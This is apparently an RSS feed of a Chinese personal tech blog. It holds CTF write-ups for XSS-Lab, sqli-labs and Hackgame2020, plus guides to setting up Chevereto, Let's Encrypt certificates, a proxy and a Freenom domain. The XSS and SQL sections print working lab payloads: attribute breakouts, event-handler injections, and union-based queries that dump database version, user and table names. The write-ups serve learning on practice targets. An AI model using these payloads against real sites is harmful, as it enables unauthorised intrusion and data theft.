&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;佰&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp&lt;span style="color:#f92672">*&lt;/span>100;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;元&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;角&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp&lt;span style="color:#f92672">*&lt;/span>0.&lt;span style="color:#a6e22e">1&lt;/span>;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;分&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp&lt;span style="color:#f92672">*&lt;/span>0.&lt;span style="color:#a6e22e">01&lt;/span>;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;整&amp;#39;&lt;/span>: &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">default&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;这个认不出来&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> s.&lt;span style="color:#a6e22e">charAt&lt;/span>(i));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> res;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	程序用的控制台输入，直接表格两列从头拉倒尾粘贴，出答案。程序的思路就是把金额大写当做字符串处理，每一位用&lt;code>switch&lt;/code>判断数字或是个、十、百、千那一位上的数字。&lt;/p></description></item><item><title>XSS-Lab (一)</title><link>/posts/ctf/xss-lab1/</link><pubDate>Tue, 03 Nov 2020 10:13:39 +0000</pubDate><guid>/posts/ctf/xss-lab1/</guid><description>&lt;h2 id="头">头&lt;/h2>
&lt;p>靶机地址：https://buuoj.cn/challenges#XSS-Lab&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsmJ5n.png" alt="">&lt;/p>
&lt;h2 id="level-1">level 1&lt;/h2>
&lt;p>​	&lt;img src="https://s1.ax1x.com/2020/11/03/BsmfKO.png" alt="">&lt;/p>
&lt;p>​	观察发现&lt;code>欢迎用户test&lt;/code>与URL中的&lt;code>name=test&lt;/code>字段对应，尝试修改发现可行。直接将&lt;code>name&lt;/code>字段改为&lt;code>name=&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&lt;/code>，完工。&lt;/p>
&lt;h2 id="level-2">level 2&lt;/h2>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsnwWt.png" alt="">&lt;/p>
&lt;p>​	在搜索栏中的输入会回显到页面，查看网页源代码，发现值在&lt;code>input&lt;/code>的&lt;code>value&lt;/code>属性中&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsnLk9.png" alt="">&lt;/p>
&lt;p>​	构造闭合&lt;code>&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &lt;/code>，构造以后的标签会变成&lt;code>.... value=&amp;quot;&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &amp;quot;&amp;gt;&lt;/code>。完工&lt;/p>
&lt;h2 id="level-3">level 3&lt;/h2>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsKwKf.png" alt="">&lt;/p>
&lt;p>​	老样子构造&lt;code>value&lt;/code>属性闭合，尝试&lt;code>&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &lt;/code>构造闭合，查看网页源代码发现语句变成&lt;code>&amp;amp;quot;&amp;amp;gt; &amp;amp;lt;script&amp;amp;gt;alert()&amp;amp;lt;/script&amp;amp;gt; // &lt;/code>，说明把&lt;code>&amp;quot;、&amp;lt;、&amp;gt;、&lt;/code>进行了html编码过滤，尝试构造&lt;code>onmouseover&lt;/code>事件(鼠标移到事件)，构造语句&lt;code>'onmouseover='alert()'&lt;/code>。完工&lt;/p>
&lt;h2 id="level-4">level 4&lt;/h2>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsMWYd.png" alt="">&lt;/p>
&lt;p>​	构造闭合&lt;code>&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &lt;/code>，查看源代码发现进行了&lt;code>&amp;gt;、&amp;lt;&lt;/code>过滤，尝试构造事件&lt;code>&amp;quot; onmouseover='alert()'&lt;/code>。完工&lt;/p>
&lt;p>​	说明一下标签的事件有很多类型，可以自己试试别的事件响应。&lt;/p>
&lt;h2 id="level-5">level 5&lt;/h2>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/Bs1Ci4.png" alt="">&lt;/p>
&lt;p>​	检查一下都有什么过滤。发现有一下过滤&lt;/p>
&lt;blockquote>
&lt;p>script &amp;ndash;&amp;gt; scr_ipt&lt;/p>
&lt;p>onmouseover &amp;ndash;&amp;gt; o_nmouseover&lt;/p>&lt;/blockquote>
&lt;p>无法采用事件，那么尝试构造一个标签&lt;code> &amp;quot;&amp;gt; &amp;lt;a href='javascript:alert()'&amp;gt;233&amp;lt;/a&amp;gt; //&lt;/code>，发现&lt;code>javascript&lt;/code>没有过滤，说明判断语句匹配值仅仅为&lt;code>script&lt;/code>，点击构造的&lt;code>&amp;lt;a&amp;gt;&lt;/code>标签内容。完工&lt;/p>
&lt;p>​&lt;/p></description></item><item><title>Hackgame2020(一)</title><link>/posts/ctf/hackgame20201/</link><pubDate>Sun, 01 Nov 2020 18:33:40 +0000</pubDate><guid>/posts/ctf/hackgame20201/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>比赛地址：https://hack.lug.ustc.edu.cn/&lt;/p>
&lt;h1 id="web">web&lt;/h1>
&lt;h3 id="签到题">签到题&lt;/h3>
&lt;p>​	第一题是flag提取器，打开题目以后页面是一个提取器下面一个&lt;code>进度条&lt;/code>和一个&lt;code>提取&lt;/code>按钮。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwJbJs.png" alt="BwJbJs.png">&lt;/p>
&lt;p>​	随便拉了拉进度条发现初始是&lt;code>0&lt;/code>末尾是&lt;code>1.5&lt;/code>，然后中间的数值都是小数&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwYAQx.png" alt="BwYAQx.png">&lt;/p>
&lt;p>​	我猜的题目可能是想让数值为&lt;code>1&lt;/code>时能提取到flag。&lt;/p>
&lt;p>​	F12查看源代码，定位到进度条的标签，查看属性&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwYoX6.png" alt="">&lt;/p>
&lt;p>​	确实和猜测一样最大最小值分别是&lt;code>0&lt;/code>、&lt;code>1.5&lt;/code>，注意到&lt;code>step&lt;/code>值为&lt;code>0.00001&lt;/code>，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到&lt;code>1&lt;/code>个flag，就把网页上的&lt;code>step&lt;/code>值改为&lt;code>1&lt;/code>。然后随便拖动一下进度条得到&lt;code>1&lt;/code>，点击&lt;code>提取&lt;/code>按钮，完工。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwNVaD.png" alt="">&lt;/p>
&lt;h3 id="2048">2048&lt;/h3>
&lt;p>​	打开题目是一个&lt;code>2048&lt;/code>的小游戏，第一个想法就是玩&lt;code>2048&lt;/code>达到一定分数以后会获得flag（&lt;del>可恶这个比赛怎么知道最近我天天在玩2048的&lt;/del>）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种&lt;del>逃课废物&lt;/del>是不可能努力哒！&lt;/p>
&lt;p>F12开始翻网页资源&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwUONF.png" alt="">&lt;/p>
&lt;p>​	还好上次&lt;del>摸鱼&lt;/del>课题做了一个网页版的2048，略微能看懂一点点结构，第一个&lt;code>animframe_polyfill&lt;/code>应该就是管动画效果的，&lt;code>keynpard...&lt;/code>这个肯定是相应按键的，&lt;code>local_storage_manager&lt;/code>应该是保存游戏的，&lt;code>game_manager&lt;/code>感觉就是管理整个游戏的主要文件。&lt;/p>
&lt;p>​	打开&lt;code>game_manager&lt;/code>粗略的看了下变量，&lt;code>score&lt;/code> 分数、&lt;code>over、won、keepPlaying&lt;/code>游戏状态，想赢游戏肯定是和&lt;code>score、won&lt;/code>有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。&lt;/p>
&lt;p>发现了&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwdGdK.png" alt="">&lt;/p>
&lt;p>​	只有这里修改了&lt;code>won&lt;/code>的状态，前面还有个&lt;code>16384&lt;/code>这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（&lt;del>小声bb&lt;/del>&lt;a href="https://s1.ax1x.com/2020/11/01/BwUdte.jpg">截图为证&lt;/a>），直接让&lt;code>if&lt;/code>里面的语句为真就可以获胜，直接修改&lt;code>if(1) self.won = true&lt;/code>，保存文件，按一个方向键让语句执行到，完工。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwwpTK.png" alt="">&lt;/p>
&lt;h1 id="general">general&lt;/h1>
&lt;h3 id="猫咪问题">猫咪问题++&lt;/h3>
&lt;p>​	秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwLtDs.png" alt="">&lt;/p>
&lt;p>​	题意思很明显的书考验同学的搜题技巧。那就开工。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwLD8U.png" alt="">&lt;/p>
&lt;h4 id="第一题">第一题&lt;/h4>
&lt;blockquote>
&lt;ol>
&lt;li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？&lt;/li>
&lt;/ol>
&lt;p>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.&lt;/p>
&lt;p>提示：学术上一般认为龙不属于哺乳动物。&lt;/p>&lt;/blockquote>
&lt;p>​	本人只认识几个，那就一个一个搜呗。我的模式是：百度&lt;code>xxx标志&lt;/code>然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度&lt;code>xxx是哺乳动物吗&lt;/code>，妥妥的&lt;del>胎儿&lt;/del>教学。&lt;/p>
&lt;p>​	一个比较有印象就是&lt;code>FreeDOS&lt;/code>这个标志就离谱，什么玩意&lt;/p>
&lt;p>&lt;img src="https://src.onlinedown.net/supply/sup_logo/logo-1122/46778_g.jpg" alt="">&lt;/p>
&lt;p>&lt;strong>参考答案 ：12&lt;/strong>&lt;/p>
&lt;h4 id="第二题">第二题&lt;/h4>
&lt;blockquote>
&lt;ol start="2">
&lt;li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？&lt;/li>
&lt;/ol>&lt;/blockquote>
&lt;p>​	卡了我好一会，没听过信鸽传输，贴上最后找到答案的&lt;a href="https://blog.csdn.net/qq_31621387/article/details/77690642">博客&lt;/a>，以及一篇信鸽传输的&lt;a href="http://sohu.com/a/309403082_354973">历史发展&lt;/a>，长见识了。&lt;/p></description></item><item><title>sql-labs(一)</title><link>/posts/ctf/sql-labs1/</link><pubDate>Tue, 22 Sep 2020 10:50:08 +0000</pubDate><guid>/posts/ctf/sql-labs1/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>在线靶机地址：https://buuoj.cn/challenges#sqli-labs&lt;/p>
&lt;h2 id="less-1">less-1&lt;/h2>
&lt;p>​	首先说明sql注入的大致步骤：&lt;/p>
&lt;ul>
&lt;li>判断注入类型。如整型字符型注入等。&lt;/li>
&lt;li>判断列数&lt;/li>
&lt;li>判断数据的回显位&lt;/li>
&lt;li>构造sql语句&lt;/li>
&lt;/ul>
&lt;p>​	根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句&lt;code>?id=1'&lt;/code>，发现数据库报错&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/04/BgERNd.png" alt="">&lt;/p>
&lt;p>​	通过后面的报错语句&lt;code>1'' LIMIT 0,1&lt;/code>的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询&lt;code>union&lt;/code>插入我们想要查询的语句。&lt;/p>
&lt;p>​	推出数据库的查询的部分语句可能为&lt;code>where id = '$id'LIMIT 0,1&lt;/code>，那么通过构造闭合&lt;code>?id=1' [这里添加语句] --+&lt;/code>添加自己想要语句，语句后面的&lt;code>--+&lt;/code>作用是将后面的其他语句注释掉。&lt;/p>
&lt;p>​	首先是判断字段个数：&lt;code>?id=1' order by 1 --+&lt;/code>，页面显示正常，直到尝试&lt;code>?id=1' order by 4 --+&lt;/code>发现数据库报错&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/04/BgVsGn.png" alt="">&lt;/p>
&lt;p>​	说明数据库的字段值只有四个。&lt;/p>
&lt;p>​	接下来测试数据的回显位，构造语句&lt;code>?id=' union select 1,2,3 --+&lt;/code>，这里需要注意的有，前面&lt;code>id&lt;/code>的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面&lt;code>union&lt;/code>构造的语句就不会显示；&lt;code>union&lt;/code>连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。&lt;/p>
&lt;p>​	执行后页面显示。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/04/BgZAeS.png" alt="">&lt;/p>
&lt;p>​	说明查询语句的&lt;code>2,3&lt;/code>是回显位，之后就可以将查询的语句进行替换。如：&lt;/p>
&lt;p>​	获取数据库版本，数据库路径，当前用户，当前数据库：
​	&lt;code>?id=' union select 1,concat_ws('_',user(),version(),database()),@@basedir --+&lt;/code>&lt;/p>
&lt;p>页面显示&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/04/BgZbfs.png" alt="">&lt;/p>
&lt;p>​	利用元数据库来爆表、爆数据&lt;/p>
&lt;p>​	&lt;code>?id=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+&lt;/code>&lt;/p></description></item><item><title>Chevereto-搭建一个自己的图床</title><link>/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/</link><pubDate>Sun, 20 Sep 2020 11:09:02 +0000</pubDate><guid>/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/</guid><description>&lt;p>博客搭完了，自己选择的这个博客主题又是以图片为主要元素的，当然要考虑图片的使用问题了，原来打算直接放在服务器上，但是后来想了想，以后如果文章&lt;del>越写越多&lt;/del>用的图太多服务器的流量也不够用，想到了图床这一托管图片的服务，但是放在别人的上面总怕会受到&lt;del>限制&lt;/del>，正好发现了&lt;code>Chevereto&lt;/code>这一图床系统，可以自己搭建一个图床服务器，正好自己还有一个阿里云学生云，那就开工。&lt;/p>
&lt;h3 id="chevereto-说明">Chevereto 说明&lt;/h3>
&lt;blockquote>
&lt;p>Chevereto是一个可以帮助你建立自己的图像分享网站（图床）的应用程序，我们的目标是可以让世界上的任何一个人都可以建立自己的图像共享平台。我们坚定不移的为那些想要可定制的白标图像共享服务的人建立一个真正的替代品。&lt;/p>&lt;/blockquote>
&lt;p>&lt;code>Chevereto&lt;/code>分为免费版和付费版，区别肯定就是大小什么的，我这个搭在学生云上肯定就不用想我会选择哪个了吧🤣&lt;/p>
&lt;h3 id="环境说明">环境说明&lt;/h3>
&lt;p>因为&lt;code>Chevereto&lt;/code>所需要的环境为&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Apache/Nginx&lt;/p>
&lt;/li>
&lt;li>
&lt;p>PHP 5.5+&lt;/p>
&lt;/li>
&lt;li>
&lt;p>MySQL 5.0+&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;del>我太懒了不想动&lt;/del>所以我选择使用宝塔面板为我们搭建web环境。&lt;/p>
&lt;p>宝塔面板官网：https://www.bt.cn/&lt;/p>
&lt;p>安装完成以后进入管理面板应该会直接提示你安装需要的环境&lt;/p>
&lt;p>我的环境如下图&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9TVP.png" alt="BJ9TVP.png">&lt;/p>
&lt;h3 id="总结安装步骤">总结安装步骤&lt;/h3>
&lt;ol>
&lt;li>去github下载Chevereto的压缩包。&lt;/li>
&lt;li>在宝塔面板上新建网站目录，创建一个存图片的数据库(自行创建)。&lt;/li>
&lt;li>将Chevereto的压缩包上传到网站目录解压。&lt;/li>
&lt;li>访问新建的网站就是Chevereto的管理面板，并进行初始配置。&lt;/li>
&lt;li>无了。&lt;/li>
&lt;/ol>
&lt;h3 id="开始">开始&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://github.com/Chevereto/Chevereto-Free/releases">github下载地址&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>创建网站目录和数据库用户&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9H58.png" alt="BJ9H58.png">&lt;/p>
&lt;p>因为我域名所以域名留空，提示默认使用&lt;code>80&lt;/code>端口，访问地址就是服务器ip地址，剩下的自己随机发挥。&lt;/p>
&lt;ul>
&lt;li>创建完成后需要配置一下网站配置文件才可以访问到配置页面。&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9Ibt.png" alt="BJ9Ibt.png">&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9qPS.png" alt="BJ9qPS.png">&lt;/p>
&lt;p>在&lt;code>server{...}&lt;/code>中添加&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-nginx" data-lang="nginx">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">location&lt;/span> &lt;span style="color:#e6db74">/&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">try_files&lt;/span> $uri $uri/ &lt;span style="color:#e6db74">/index.php?&lt;/span>$query_string;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>配置完成以后应该会自动保存并重启&lt;code>Nginx&lt;/code>。&lt;/p>
&lt;ul>
&lt;li>将在github上下载的&lt;code>Chevereto&lt;/code>压缩包上传到刚刚创建的网站目录中（上图是&lt;code>/www/wwwroot&lt;/code>）并解压。&lt;/li>
&lt;/ul>
&lt;p>之后就可以直接访问&lt;code>服务器ip:80&lt;/code>（80端口可以省略），然后一步一步的进行配置。&lt;/p>
&lt;p>&lt;strong>可能会出现的错误&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>&lt;code>Chevereto can’t create the app/settings.php file. You must manually create this file&lt;/code>&lt;/p>&lt;/blockquote>
&lt;p>解决方法：这个错误就是没有找到&lt;code>setting.php&lt;/code>配置文件，压缩包内似乎没有创建该文件，我们可以自行创建，在&lt;code>Chevereto&lt;/code>的网站目录下的&lt;code>/app&lt;/code>目录下执行命令创建文件，并修改文件权限&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>touch settings.php
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod +x settings.php
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>我自己还遇到了第二个错误，大概的意思就是访问权限不足blahbalhblahbla，我改了好久都不行。最后直接把整个网站目录的权限给改了访问成功。知道这样做不对，希望大佬能指点。&lt;/p>&lt;/blockquote>
&lt;ul>
&lt;li>访问网站进行网站的初始化配置，大概就是填写数据库名称、数据库账号密码、管理员的账户和密码和一些信息。&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJ97Uf.jpg" alt="BJ97Uf.jpg">&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9O2Q.jpg" alt="BJ9O2Q.jpg">&lt;/p>
&lt;p>完成以后就可以登陆管理员账号进入管理面板，我是首先去设置里找到语言设置把面板改成了中文。&lt;/p>
&lt;h3 id="完工">完工&lt;/h3>
&lt;p>管理面板还有好多其他功能，我都还没研究过，大伙可以以后可以自己慢慢学习&lt;/p></description></item><item><title>Let_s_Encrypt 免费Https证书</title><link>/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/</link><pubDate>Thu, 03 Sep 2020 15:30:37 +0000</pubDate><guid>/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/</guid><description>&lt;p>参考文章:&lt;a href="https://imququ.com/post/letsencrypt-certificate.html">Let&amp;rsquo;s Encrypt，免费好用的 HTTPS 证书&lt;/a>&lt;/p>
&lt;h3 id="先放官网">先放官网&lt;/h3>
&lt;p>&lt;a href="https://letsencrypt.org/">Let&amp;rsquo;s Encrypt&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://letsencrypt.org/">Let&amp;rsquo;s Encrypt&lt;/a> 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛&lt;/p>&lt;/blockquote>
&lt;hr>
&lt;h4 id="所需环境">所需环境&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>一个 HTTP 服务，以 Nginx 为例&lt;/p>
&lt;/li>
&lt;li>
&lt;p>python&lt;/p>
&lt;/li>
&lt;li>
&lt;p>两个目录:&lt;/p>
&lt;blockquote>
&lt;p>/site	网站目录&lt;/p>
&lt;p>/site_site_cert	保存证书的目录&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>证书的颁发有两种方式：&lt;/strong>&lt;/p>
&lt;h4 id="通过在线生成">通过在线生成&lt;/h4>
&lt;p>通过网址在线生成，需要验证文件&lt;/p>
&lt;h4 id="通过程序生成">通过程序生成&lt;/h4>
&lt;p>通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。&lt;/p>
&lt;p>我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let&amp;rsquo;s Encrypt会对网站进行访问，下载密钥进行验证。&lt;/p>
&lt;hr>
&lt;h3 id="开工">开工&lt;/h3>
&lt;h3 id="创建账号">创建账号&lt;/h3>
&lt;p>首先创建一个目录，我是在根目录下创建文件夹site_cert&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>mkdir /site_cert
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个文件夹用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个RSA私钥，用于Let&amp;rsquo;s Encrypt识别你的身份&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>openssl genrsa &lt;span style="color:#ae81ff">4096&lt;/span> &amp;gt; account.key
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="创建csr文件">创建CSR文件&lt;/h3>
&lt;p>在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>openssl genrsa &lt;span style="color:#ae81ff">4096&lt;/span> &amp;gt; domain.key
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我参考的文章提到了两种私钥RSA和ECC，我现在也还不懂什么原理，把两种区别放出来吧&lt;/p>
&lt;blockquote>
&lt;p>RSA 私钥：兼容性好&lt;/p>
&lt;p>ECC 私钥：部分老旧操作系统、浏览器不支持。优点是证书体积小&lt;/p>&lt;/blockquote>
&lt;p>两个用于身份身份验证的私钥文件创建好，就可以生成CSR（Certificate Signing Request，证书签名请求）文件了，申请时可以把域名带 &lt;code>www&lt;/code> 和不带 &lt;code>www&lt;/code> 的两种情况都加进去，一张证书最多可以包含100个域名。&lt;/p></description></item><item><title>搭窝过程(二)</title><link>/posts/%E6%90%AD%E7%AA%9D%E8%BF%87%E7%A8%8B%E4%BA%8C/</link><pubDate>Wed, 02 Sep 2020 22:05:34 +0000</pubDate><guid>/posts/%E6%90%AD%E7%AA%9D%E8%BF%87%E7%A8%8B%E4%BA%8C/</guid><description>&lt;p>​	服务器到手了肯定不能闲着，既然有了国外的服务器，第一个想法就是去整一个魔法，我姐也因为网络问题，经常让我帮忙下载国外的资料，这次整一个就能让我姐自己用了。&lt;/p>
&lt;p>​	还是出于会被Qang的顾虑，自己对于这方面的知识也很少，普通的建设方法据说已经会被主动嗅探等给检测到，于是就花了很久找伪装的方法，结果在github上找到了一个&lt;a href="https://github.com/ShadowsocksR-Live/shadowsocksr-native">项目&lt;/a>，使用的技术大概就是反向代理+Https的协议，这里就不细讲了&lt;del>主要是害怕&lt;/del>，可以自己到项目去看看。&lt;/p>
&lt;p>​	在这里还学会了搞&lt;a href="https://letsencrypt.org/">Let&amp;rsquo;s Encrypt&lt;/a>的SSL证书，主要是用来保证数据的加密传输，也就是Https协议，后面开一篇申请证书的过程文章，照着参阅的文章也踩了不少坑。&lt;/p></description></item><item><title>Freenom域名注册解析到服务器</title><link>/posts/play_time/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</link><pubDate>Wed, 02 Sep 2020 12:25:37 +0000</pubDate><guid>/posts/play_time/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid><description>&lt;h3 id="1官网">&lt;strong>1.官网&lt;/strong>&lt;/h3>
&lt;p>&lt;a href="https://www.freenom.com/zh/index.html?lang=zh">Freenom - 人人都熟悉的名字&lt;/a>&lt;/p>
&lt;p>官网右上角可以切换中文，简直了。&lt;/p>
&lt;p>然后觉得我讲的有点啰嗦的还可以看油管上的&lt;a href="https://www.youtube.com/watch?v=IAZDrtmQeh0">freenom教学视频&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9Xvj.png" alt="BJ9Xvj.png">&lt;/p>
&lt;h3 id="2搜索想要的域名">&lt;strong>2.搜索想要的域名&lt;/strong>&lt;/h3>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJCFGF.png" alt="BJCFGF.png">&lt;/p>
&lt;p>​	搜索以后会列出来可以选择的域名列表，上面的是免费域名，下面的则是一些付费域名。&lt;/p>
&lt;p>​	我在这里还遇到了一个坑提前说。freenom提供的有自己的域名解析服务，国内也可以访问的到，我遇到了一个问题有回答说换个DNS解析就行，推荐的是&lt;a href="https://dns.he.net/">Hurricane Electric Hosted &lt;em>DNS&lt;/em>&lt;/a>，但这个网站禁止了.tk域名的解析。类似的问题请自行先考虑&lt;/p>
